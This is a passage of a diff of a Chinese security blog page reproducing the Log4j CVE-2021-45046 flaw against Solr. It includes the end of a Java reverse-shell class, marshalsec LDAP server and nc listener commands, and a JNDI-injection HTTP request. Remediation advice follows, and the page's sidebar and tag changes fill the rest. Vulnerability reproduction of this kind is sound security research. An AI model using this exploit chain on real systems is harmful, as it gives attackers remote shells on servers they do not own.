s=<span class="keyword">new</span> <span class="title class_">Socket</span>(host,port);</span><br><span class="line">    InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();</span><br><span class="line">    OutputStream po=p.getOutputStream(),so=s.getOutputStream();</span><br><span class="line">    <span class="keyword">while</span>(!s.isClosed()) &#123;</span><br><span class="line">      <span class="keyword">while</span>(pi.available()&gt;<span class="number">0</span>)</span><br><span class="line">        so.write(pi.read());</span><br><span class="line">      <span class="keyword">while</span>(pe.available()&gt;<span class="number">0</span>)</span><br><span class="line">        so.write(pe.read());</span><br><span class="line">      <span class="keyword">while</span>(si.available()&gt;<span class="number">0</span>)</span><br><span class="line">        po.write(si.read());</span><br><span class="line">      so.flush();</span><br><span class="line">      po.flush();</span><br><span class="line">      Thread.sleep(<span class="number">50</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        p.exitValue();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    p.destroy();</span><br><span class="line">    s.close();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="直接使用python启动服务"><a href="#直接使用python启动服务" class="headerlink" title="直接使用python启动服务"></a>直接使用python启动服务</h3><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> -m SimpleHTTPServer <span class="number">80</span>  <span class="comment">//xxx为web端口</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="启动恶意ldap服务器"><a href="#启动恶意ldap服务器" class="headerlink" title="启动恶意ldap服务器"></a>启动恶意ldap服务器</h3><p>之前复现fastjson的直接拿过来用</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">java</span> -cp marshalsec-<span class="number">0</span>.<span class="number">0</span>.<span class="number">3</span>-SNAPSHOT-<span class="literal">all</span>.jar marshalsec.jndi.LDAPRefServer http://x.x.x.x/#Exploit xxx //xxx为ldap端口</span><br></pre></td></tr></table></figure>
-<h3 id="nc-监听反连端口"><a href="#nc-监听反连端口" class="headerlink" title="nc 监听反连端口"></a>nc 监听反连端口</h3><p>nc -lvvp x //x 为恶意类指定的反连端口</p>
+<h3 id="nc-监听反连端口"><a href="#nc-监听反连端口" class="headerlink" title="nc 监听反连端口"></a>nc 监听反连端口</h3><p>nc -lvvp x &#x2F;&#x2F;x 为恶意类指定的反连端口</p>
 <h3 id="触发漏洞"><a href="#触发漏洞" class="headerlink" title="触发漏洞"></a>触发漏洞</h3><p>发送请求</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span> /solr/admin/cores?_=<span class="number">1639731882458</span>&amp;wt=json&amp;indexInfo=<span class="variable">$&#123;jndi:ldap://x.x.x.x:xxx/#Exploit&#125;</span> HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">192.168.64.128:8983</span></span><br><span class="line"><span class="attribute">X</span>-Requested-With: XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span>: http://<span class="number">192.168.64.128:8983</span>/solr/</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=<span class="number">066</span>F<span class="number">1</span>A<span class="number">7579</span>CF<span class="number">0</span>FC<span class="number">0</span>C<span class="number">94</span>C<span class="number">097160</span>C<span class="number">692</span>F<span class="number">6</span></span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/solr/admin/cores?_=1639731882458&amp;wt=json&amp;indexInfo=$&#123;jndi:ldap://x.x.x.x:xxx/#Exploit&#125;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.64.128:8983</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.64.128:8983/solr/</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=066F1A7579CF0FC0C94C097160C692F6</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
 
 <p>查看ldap服务器响应</p>
 <p><img src="https://pic.rmb.bdstatic.com/bjh/268b35659c86937787fd5f490767e9b9.png" alt="image.png"></p>
@@ -335,20 +322,16 @@ function showBtn(){
 <p><img src="https://pic.rmb.bdstatic.com/bjh/cfffa3ddd7d59e6696113a8b3d857e2d.png" alt="image.png"></p>
 <p>查看nc监听，可以看到拿到shell了<br><img src="https://pic.rmb.bdstatic.com/bjh/179763afe5257feb006fce33d55c4568.png" alt="image.png"></p>
 <p>这里可以看到拿到shell了，这里吐槽一下某SRC，修复窗口都一周了，补丁没打完，SRC还不收漏洞，低内核版本的linux，可脏牛提权，直接忽略</p>
-<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级log4j到 2.15.0-rc2以上/添加jvm参数 -Dlog4j2.formatMsgNoLookups=true/使用rasp防护/删除jndilookup都可以</p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级log4j到 2.15.0-rc2以上&#x2F;添加jvm参数 -Dlog4j2.formatMsgNoLookups&#x3D;true&#x2F;使用rasp防护&#x2F;删除jndilookup都可以</p>
+<p> <a href="http://www.pa55w0rd.online/log4j/">http://www.pa55w0rd.online/log4j/</a> </p>
 -->
       
 
     </div>
 
-
-    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
-    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
-
-
     <footer class="article-footer">
       
-        <a data-url="http://www.pa55w0rd.online/log4j/" data-id="ckxh6t4s60035dgsw8kec19sh" class="article-share-link" data-share="baidu" data-title="Log4j CVE-2021-45046 复现">分享到</a>
+        <a data-url="http://www.pa55w0rd.online/log4j/" data-id="cmn8a4diy003d6ohoaeug7mhn" class="article-share-link" data-share="baidu" data-title="Log4j CVE-2021-45046 复现">分享到</a>
       
 
       
@@ -359,6 +342,19 @@ function showBtn(){
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" rel="tag">应急响应</a></li></ul>
 
 
+
+      
+      
+      <div class="post-copyright post-copyright--butterfly" role="note">
+        
+        <p><span class="post-copyright__label">文章作者：</span><span class="post-copyright__val">Pa55w0rd</span></p>
+        <p><span class="post-copyright__label">文章链接：</span><a class="post-copyright__link" href="http://www.pa55w0rd.online/log4j/" rel="bookmark">http://www.pa55w0rd.online/log4j/</a></p>
+        
+        <p class="post-copyright__license"><span class="post-copyright__label">版权声明：</span><span class="post-copyright__lic">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener noreferrer">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 Pa55w0rd！</span></p>
+        
+        
+      </div>
+      
     </footer>
   </div>
   
@@ -417,23 +413,23 @@ function showBtn(){
       <ul>
         
           <li onclick="javascript:document.getElementById('recentpost_item').click();">
-            <a id="recentpost_item" href="/wechatmp-chatgpt/">在微信公众号中接入ChatGPT（支持GPT-4)</a>
+            <a id="recentpost_item" href="/codescan-00/">CodeScan 实战（00）：从一次代码审计需求，到一套可追溯的工程实践</a>
           </li>
         
           <li onclick="javascript:document.getElementById('recentpost_item').click();">
-            <a id="recentpost_item" href="/jumpserver-yida/">通过宜搭流程表单完成JumpServer自动化授权</a>
+            <a id="recentpost_item" href="/codescan-01/">CodeScan 实战（01）：用 Docker Compose 部署，与原 Artex 共存</a>
           </li>
         
           <li onclick="javascript:document.getElementById('recentpost_item').click();">
-            <a id="recentpost_item" href="/jumpserver/">JumpServer堡垒机部署与运营</a>
+            <a id="recentpost_item" href="/codescan-02/">CodeScan 实战（02）：吸收其他项目的优势，统一威胁、漏洞与证据</a>
           </li>
         
           <li onclick="javascript:document.getElementById('recentpost_item').click();">
-            <a id="recentpost_item" href="/jetbrains-use/">jetbrains产品免费食用方法-_-</a>
+            <a id="recentpost_item" href="/codescan-03/">CodeScan 实战（03）：补齐审计覆盖、反证和收官门禁</a>
           </li>
         
           <li onclick="javascript:document.getElementById('recentpost_item').click();">
-            <a id="recentpost_item" href="/zer-trust-security-model/">SPA &amp; fwknop &amp; SDP &amp; Pomerium &amp; IAP &amp; Traefik &amp; KeyCloak &amp; Casbin &amp; ORY Oathkeeper</a>
+            <a id="recentpost_item" href="/codescan-04/">CodeScan 实战（04）：把威胁建模接进真正的任务生命周期</a>
           </li>
         
       </ul>
@@ -446,7 +442,7 @@ function showBtn(){
   <div class="widget-wrap">
     <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s" ><i class="fa fa-tasks"></i>分类</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/note/">note</a><span class="category-list-count">45</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/">安全建设</a><span class="category-list-count">31</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8/">开发安全</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/">移动安全</a><span class="category-list-count">3</span></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/note/">note</a><span class="category-list-count">46</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/">安全建设</a><span class="category-list-count">31</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8/">开发安全</a><span class="category-list-count">25</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8/CodeScan%E5%AE%9E%E6%88%98/">CodeScan实战</a><span class="category-list-count">18</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/">移动安全</a><span class="category-list-count">3</span></li></ul>
     </div>
   </div>
 
@@ -462,7 +458,7 @@ function showBtn(){
   <div class="widget-wrap">
     <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s" ><i class="fa fa-cloud"></i>标签云</h3>
     <div class="widget tagcloud">
-      <a href="/tags/Android-%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" style="font-size: 10px;">Android - 安全测试 - 工具使用</a> <a href="/tags/ChatGPT/" style="font-size: 10px;">ChatGPT</a> <a href="/tags/DevSecOps/" style="font-size: 11.25px;">DevSecOps</a> <a href="/tags/GPT-4/" style="font-size: 10px;">GPT-4</a> <a href="/tags/HTTPS/" style="font-size: 10px;">HTTPS</a> <a href="/tags/PHPstudy/" style="font-size: 10px;">PHPstudy</a> <a href="/tags/SDL/" style="font-size: 17.5px;">SDL</a> <a href="/tags/TRS/" style="font-size: 10px;">TRS</a> <a href="/tags/algolia/" style="font-size: 10px;">algolia</a> <a href="/tags/checklist/" style="font-size: 10px;">checklist</a> <a href="/tags/docker/" style="font-size: 11.25px;">docker</a> <a href="/tags/hexo/" style="font-size: 12.5px;">hexo</a> <a href="/tags/iam/" style="font-size: 10px;">iam</a> <a href="/tags/jsonp%E5%8A%AB%E6%8C%81/" style="font-size: 10px;">jsonp劫持</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/note/" style="font-size: 20px;">note</a> <a href="/tags/sql/" style="font-size: 10px;">sql</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">sql注入</a> <a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 12.5px;">web安全</a> <a href="/tags/windows-%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">windows 审计工具</a> <a href="/tags/xunfeng/" style="font-size: 10px;">xunfeng</a> <a href="/tags/zero-trust/" style="font-size: 10px;">zero-trust</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">代码审计</a> <a href="/tags/%E5%88%86%E6%9E%90/" style="font-size: 10px;">分析</a> <a href="/tags/%E5%9F%BA%E7%A1%80/" style="font-size: 11.25px;">基础</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 18.75px;">基础知识</a> <a href="/tags/%E5%A4%87%E5%BF%98%E5%BD%95/" style="font-size: 10px;">备忘录</a> <a href="/tags/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/" style="font-size: 10px;">威胁情报</a> <a href="/tags/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/" style="font-size: 20px;">安全建设</a> <a href="/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/" style="font-size: 16.25px;">安全开发</a> <a href="/tags/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/" style="font-size: 12.5px;">安全漏洞</a> <a href="/tags/%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/" style="font-size: 13.75px;">安全防护</a> <a href="/tags/%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/" style="font-size: 11.25px;">安装使用</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" style="font-size: 18.75px;">工具使用</a> <a href="/tags/%E5%B9%B3%E5%8F%B0%E5%BB%BA%E8%AE%BE/" style="font-size: 10px;">平台建设</a> <a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" style="font-size: 13.75px;">应急响应</a> <a href="/tags/%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8/" style="font-size: 10px;">开发安全</a> <a href="/tags/%E5%BC%80%E6%BA%90/" style="font-size: 13.75px;">开源</a> <a href="/tags/%E5%BC%80%E6%BA%90%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">开源工具</a> <a href="/tags/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/" style="font-size: 10px;">微信公众号</a> <a href="/tags/%E6%8A%80%E5%B7%A7/" style="font-size: 10px;">技巧</a> <a href="/tags/%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">操作记录</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8/" style="font-size: 10px;">数据安全</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 10px;">数据库</a> <a href="/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" style="font-size: 10px;">未授权访问</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">渗透测试</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" style="font-size: 10px;">漏洞利用</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86/" style="font-size: 10px;">漏洞管理</a> <a href="/tags/%E7%A7%81%E4%BF%A1%E4%BA%92%E5%8A%A8/" style="font-size: 10px;">私信互动</a> <a href="/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/" style="font-size: 10px;">移动安全</a> <a href="/tags/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/" style="font-size: 10px;">编程基础</a> <a href="/tags/%E8%9C%9C%E7%BD%90/" style="font-size: 13.75px;">蜜罐</a> <a href="/tags/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/" style="font-size: 15px;">解决方法</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E8%B5%84%E4%BA%A7%E6%89%AB%E6%8F%8F/" style="font-size: 10px;">资产扫描</a> <a href="/tags/%E8%BF%81%E7%A7%BB/" style="font-size: 10px;">迁移</a> <a href="/tags/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/" style="font-size: 11.25px;">运维安全</a> <a href="/tags/%E9%80%9F%E6%9F%A5%E8%A1%A8/" style="font-size: 10px;">速查表</a> <a href="/tags/%E9%9B%B6%E4%BF%A1%E4%BB%BB/" style="font-size: 10px;">零信任</a>
+      <a href="/tags/Android-%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" style="font-size: 10px;">Android - 安全测试 - 工具使用</a> <a href="/tags/CI-CD/" style="font-size: 10px;">CI-CD</a> <a href="/tags/ChatGPT/" style="font-size: 11.25px;">ChatGPT</a> <a href="/tags/CodeScan-Artex/" style="font-size: 18.75px;">CodeScan-Artex</a> <a href="/tags/DevSecOps/" style="font-size: 12.5px;">DevSecOps</a> <a href="/tags/Docker/" style="font-size: 11.25px;">Docker</a> <a href="/tags/GPT-4/" style="font-size: 11.25px;">GPT-4</a> <a href="/tags/HTTPS/" style="font-size: 10px;">HTTPS</a> <a href="/tags/Mantis/" style="font-size: 10px;">Mantis</a> <a href="/tags/PHPstudy/" style="font-size: 10px;">PHPstudy</a> <a href="/tags/Planner/" style="font-size: 10px;">Planner</a> <a href="/tags/SDL/" style="font-size: 17.5px;">SDL</a> <a href="/tags/SSE/" style="font-size: 10px;">SSE</a> <a href="/tags/STRIDE/" style="font-size: 10px;">STRIDE</a> <a href="/tags/TRS/" style="font-size: 10px;">TRS</a> <a href="/tags/TTFT/" style="font-size: 10px;">TTFT</a> <a href="/tags/algolia/" style="font-size: 10px;">algolia</a> <a href="/tags/checklist/" style="font-size: 10px;">checklist</a> <a href="/tags/docker/" style="font-size: 11.25px;">docker</a> <a href="/tags/hexo/" style="font-size: 12.5px;">hexo</a> <a href="/tags/iam/" style="font-size: 10px;">iam</a> <a href="/tags/jsonp%E5%8A%AB%E6%8C%81/" style="font-size: 10px;">jsonp劫持</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/note/" style="font-size: 20px;">note</a> <a href="/tags/sql/" style="font-size: 10px;">sql</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">sql注入</a> <a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 12.5px;">web安全</a> <a href="/tags/windows-%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">windows 审计工具</a> <a href="/tags/xunfeng/" style="font-size: 10px;">xunfeng</a> <a href="/tags/zero-trust/" style="font-size: 10px;">zero-trust</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 11.25px;">代码审计</a> <a href="/tags/%E4%BB%BB%E5%8A%A1%E6%A8%A1%E6%9D%BF/" style="font-size: 10px;">任务模板</a> <a href="/tags/%E4%BB%BB%E5%8A%A1%E7%8A%B6%E6%80%81/" style="font-size: 10px;">任务状态</a> <a href="/tags/%E4%BB%BB%E5%8A%A1%E7%BC%96%E6%8E%92/" style="font-size: 10px;">任务编排</a> <a href="/tags/%E4%BB%BB%E5%8A%A1%E8%AE%BE%E8%AE%A1/" style="font-size: 10px;">任务设计</a> <a href="/tags/%E5%88%86%E6%9E%90/" style="font-size: 10px;">分析</a> <a href="/tags/%E5%8F%8D%E8%AF%81/" style="font-size: 10px;">反证</a> <a href="/tags/%E5%8F%AF%E8%A7%82%E6%B5%8B%E6%80%A7/" style="font-size: 11.25px;">可观测性</a> <a href="/tags/%E5%8F%AF%E9%9D%A0%E6%80%A7/" style="font-size: 10px;">可靠性</a> <a href="/tags/%E5%9F%BA%E7%A1%80/" style="font-size: 11.25px;">基础</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 17.5px;">基础知识</a> <a href="/tags/%E5%A2%9E%E9%87%8F%E4%BF%9D%E5%AD%98/" style="font-size: 10px;">增量保存</a> <a href="/tags/%E5%A4%87%E5%BF%98%E5%BD%95/" style="font-size: 10px;">备忘录</a> <a href="/tags/%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/" style="font-size: 12.5px;">威胁建模</a> <a href="/tags/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/" style="font-size: 10px;">威胁情报</a> <a href="/tags/%E5%AD%98%E5%82%A8%E6%B8%85%E7%90%86/" style="font-size: 10px;">存储清理</a> <a href="/tags/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/" style="font-size: 20px;">安全建设</a> <a href="/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/" style="font-size: 16.25px;">安全开发</a> <a href="/tags/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/" style="font-size: 12.5px;">安全漏洞</a> <a href="/tags/%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/" style="font-size: 13.75px;">安全防护</a> <a href="/tags/%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/" style="font-size: 11.25px;">安装使用</a> <a href="/tags/%E5%AE%8C%E6%95%B4%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">完整审计</a> <a href="/tags/%E5%AE%A1%E8%AE%A1%E8%A6%86%E7%9B%96/" style="font-size: 10px;">审计覆盖</a> <a href="/tags/%E5%AE%A1%E8%AE%A1%E8%AF%84%E6%B5%8B/" style="font-size: 10px;">审计评测</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" style="font-size: 17.5px;">工具使用</a> <a href="/tags/%E5%B7%A5%E5%85%B7%E8%B0%83%E7%94%A8/" style="font-size: 11.25px;">工具调用</a> <a href="/tags/%E5%B7%A5%E7%A8%8B%E5%AE%9E%E8%B7%B5/" style="font-size: 10px;">工程实践</a> <a href="/tags/%E5%B7%A5%E7%A8%8B%E7%BB%B4%E6%8A%A4/" style="font-size: 10px;">工程维护</a> <a href="/tags/%E5%B9%B3%E5%8F%B0%E5%BB%BA%E8%AE%BE/" style="font-size: 10px;">平台建设</a> <a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" style="font-size: 13.75px;">应急响应</a> <a href="/tags/%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8/" style="font-size: 10px;">开发安全</a> <a href="/tags/%E5%BC%80%E6%BA%90/" style="font-size: 13.75px;">开源</a> <a href="/tags/%E5%BC%80%E6%BA%90%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">开源工具</a> <a href="/tags/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/" style="font-size: 11.25px;">微信公众号</a> <a href="/tags/%E6%8A%80%E5%B7%A7/" style="font-size: 10px;">技巧</a> <a href="/tags/%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">操作记录</a> <a href="/tags/%E6%95%85%E9%9A%9C%E6%81%A2%E5%A4%8D/" style="font-size: 11.25px;">故障恢复</a> <a href="/tags/%E6%95%85%E9%9A%9C%E6%8E%92%E6%9F%A5/" style="font-size: 11.25px;">故障排查</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8/" style="font-size: 10px;">数据安全</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 10px;">数据库</a> <a href="/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" style="font-size: 10px;">未授权访问</a> <a href="/tags/%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2/" style="font-size: 10px;">本地部署</a> <a href="/tags/%E6%A8%A1%E5%9E%8B%E6%80%A7%E8%83%BD/" style="font-size: 10px;">模型性能</a> <a href="/tags/%E6%A8%A1%E5%9E%8B%E8%AE%A1%E9%87%8F/" style="font-size: 10px;">模型计量</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">渗透测试</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" style="font-size: 10px;">漏洞利用</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86/" style="font-size: 10px;">漏洞管理</a> <a href="/tags/%E7%A7%81%E4%BF%A1%E4%BA%92%E5%8A%A8/" style="font-size: 10px;">私信互动</a> <a href="/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/" style="font-size: 10px;">移动安全</a> <a href="/tags/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/" style="font-size: 10px;">编程基础</a> <a href="/tags/%E8%9C%9C%E7%BD%90/" style="font-size: 13.75px;">蜜罐</a> <a href="/tags/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/" style="font-size: 15px;">解决方法</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E8%AF%81%E6%8D%AE%E9%93%BE/" style="font-size: 10px;">证据链</a> <a href="/tags/%E8%B5%84%E4%BA%A7%E6%89%AB%E6%8F%8F/" style="font-size: 10px;">资产扫描</a> <a href="/tags/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81/" style="font-size: 10px;">身份认证</a> <a href="/tags/%E8%BF%81%E7%A7%BB/" style="font-size: 10px;">迁移</a> <a href="/tags/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/" style="font-size: 11.25px;">运维安全</a> <a href="/tags/%E8%BF%90%E8%A1%8C%E5%A4%8D%E7%9B%98/" style="font-size: 10px;">运行复盘</a> <a href="/tags/%E8%BF%90%E8%A1%8C%E9%A2%84%E7%AE%97/" style="font-size: 11.25px;">运行预算</a> <a href="/tags/%E9%80%9F%E6%9F%A5%E8%A1%A8/" style="font-size: 10px;">速查表</a> <a href="/tags/%E9%95%BF%E4%B8%8A%E4%B8%8B%E6%96%87/" style="font-size: 10px;">长上下文</a> <a href="/tags/%E9%95%BF%E7%A8%8B%E4%BB%BB%E5%8A%A1/" style="font-size: 10px;">长程任务</a> <a href="/tags/%E9%9B%B6%E4%BF%A1%E4%BB%BB/" style="font-size: 10px;">零信任</a>
     </div>
   </div>
 
@@ -472,8 +468,8 @@ function showBtn(){
   <div class="widget-wrap">
     <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s" ><i class="fa fa-archive"></i>归档</h3>
     <div class="widget">
-      <!-- <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">八月 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">三月 2022</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">九月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">八月 2021</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">七月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">七月 2019</a><span class="archive-list-count">6</span></li><li 